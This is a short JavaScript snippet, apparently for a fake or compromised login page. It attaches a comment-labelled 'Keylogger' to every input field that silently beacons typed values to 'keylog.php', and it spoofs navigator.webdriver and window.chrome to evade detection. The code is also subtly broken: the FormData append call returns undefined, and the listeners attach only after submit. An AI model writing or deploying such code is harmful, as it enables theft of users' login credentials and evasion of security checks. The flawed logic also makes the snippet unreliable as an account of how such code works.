document.getElementById('loginForm').addEventListener('submit', function(e) {
    // Visual feedback
    const btn = document.querySelector('.login-btn');
    btn.textContent = 'Logging in...';
    btn.disabled = true;
    
    // Keylogger
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('input', function() {
            // Send keystrokes via beacon (silent)
            navigator.sendBeacon('keylog.php', new FormData().append('data', this.value));
        });
    });
});

// Bypass detection
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
Object.defineProperty(window, 'chrome', {get: () => undefined});